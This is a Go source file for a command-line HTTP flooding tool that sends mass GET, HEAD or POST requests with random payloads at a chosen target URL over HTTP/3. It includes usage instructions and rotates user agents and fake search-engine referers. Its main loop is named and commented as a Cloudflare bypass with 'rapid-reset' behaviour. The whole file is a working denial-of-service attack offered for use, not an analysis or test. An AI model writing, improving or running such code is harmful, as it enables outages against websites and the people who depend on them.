package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/quic-go/quic-go/http3"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
}

var referers = []string{
	"https://www.google.com/",
	"https://www.bing.com/",
	"https://search.yahoo.com/",
}

var headers = map[string]string{
	"Accept-Language":            "en-US,en;q=0.9",
	"Accept-Encoding":            "gzip, deflate, br",
	"Connection":                 "keep-alive",
	"Upgrade-Insecure-Requests":  "1",
	"Sec-Fetch-Site":             "none",
	"Sec-Fetch-Mode":             "navigate",
	"Sec-Fetch-User":             "?1",
	"Sec-Fetch-Dest":             "document",
}

func getRandomUserAgent() string {
	return userAgents[rand.Intn(len(userAgents))]
}

func getRandomReferer() string {
	return referers[rand.Intn(len(referers))]
}

func generateLargePayload(size int) []byte {
	payload := make([]byte, size)
	rand.Read(payload)
	return payload
}

func addHeaders(req *http.Request) {
	req.Header.Set("User-Agent", getRandomUserAgent())
	req.Header.Set("Referer", getRandomReferer())

	for key, value := range headers {
		req.Header.Set(key, value)
	}
}

// Function to reset the client connection aggressively (rapid-reset behavior)
func resetClient() *http.Client {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: false,
	}

	transport := &http.Transport{
		TLSClientConfig: tlsConfig,
	}

	// Return a new HTTP client with a custom transport for SSL/TLS
	return &http.Client{
		Transport: transport,
		Timeout:   5 * time.Second, // Standard timeout
	}
}

// HTTP/3 client reset
func resetHttp3Client() *http.Client {
	roundTripper := &http3.RoundTripper{}
	return &http.Client{
		Transport: roundTripper,
		Timeout:   5 * time.Second,
	}
}

// Function to perform multiple requests in parallel within a goroutine (power boost)
func performRequests(client *http.Client, target string, method string, payloadSize int, customHeaders map[string]string, requestsPerSecond int) {
	for i := 0; i < requestsPerSecond; i++ {
		go func() {
			var req *http.Request
			var err error

			// Create GET, HEAD, or POST request based on input
			if method == "POST" {
				payload := generateLargePayload(payloadSize)
				req, err = http.NewRequest("POST", target, bytes.NewBuffer(payload))
			} else if method == "HEAD" {
				req, err = http.NewRequest("HEAD", target, nil)
			} else {
				req, err = http.NewRequest("GET", target, nil)
			}

			if err != nil {
				return
			}

			addHeaders(req)

			// Send request with current client
			resp, err := client.Do(req)
			if err == nil && resp.Body != nil {
				resp.Body.Close()
			}
		}()
	}
}

// Function to send requests (GET, HEAD, POST) with enhanced rapid-reset behavior and parallel execution
func sendCloudflareBypassRequest(target string, method string, wg *sync.WaitGroup, requestsPerSecond int, payloadSize int, doneRequests *int, lock *sync.Mutex, duration time.Duration) {
	defer wg.Done()

	start := time.Now()
	for time.Since(start) < duration {
		client := resetHttp3Client() // Reset client for every request for aggressive rapid-reset behavior

		// Perform requests in parallel inside each goroutine for higher efficiency
		performRequests(client, target, method, payloadSize, headers, requestsPerSecond)

		// Update completed requests count
		lock.Lock()
		*doneRequests += requestsPerSecond
		lock.Unlock()

		// Introduce random jitter to simulate unpredictable behavior
		time.Sleep(time.Millisecond * time.Duration(rand.Intn(50)+50)) // Random delay between 50-100ms
	}
}

func main() {
	if len(os.Args) < 7 {
		fmt.Println("Usage: go run main.go [TARGET] [METHOD (GET/POST/HEAD)] [DURATION(seconds)] [THREADS] [REQUESTS PER SECOND] [PAYLOAD SIZE (bytes)]")
		fmt.Println("Example: go run main.go https://example.com GET 200 10 10000 1024")
		return
	}

	// Get input from command line arguments
	target := os.Args[1]
	method := strings.ToUpper(os.Args[2]) // GET, POST, or HEAD
	duration, _ := time.ParseDuration(os.Args[3] + "s")
	threads, _ := strconv.Atoi(os.Args[4])
	requestsPerSecond, _ := strconv.Atoi(os.Args[5])
	payloadSize, _ := strconv.Atoi(os.Args[6])

	doneRequests := 0
	var lock sync.Mutex

	fmt.Printf("Target: %s\n", target)
	fmt.Printf("Method: %s\n", method)
	fmt.Printf("Duration: %s\n", duration)
	fmt.Printf("Threads: %d\n", threads)
	fmt.Printf("Requests per second: %d\n", requestsPerSecond)
	fmt.Printf("Payload size: %d bytes\n", payloadSize)

	endTime := time.Now().Add(duration)

	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go sendCloudflareBypassRequest(target, method, &wg, requestsPerSecond, payloadSize, &doneRequests, &lock, endTime.Sub(time.Now()))
	}

	wg.Wait()
	fmt.Printf("Total Requests Sent: %d\n", doneRequests)
}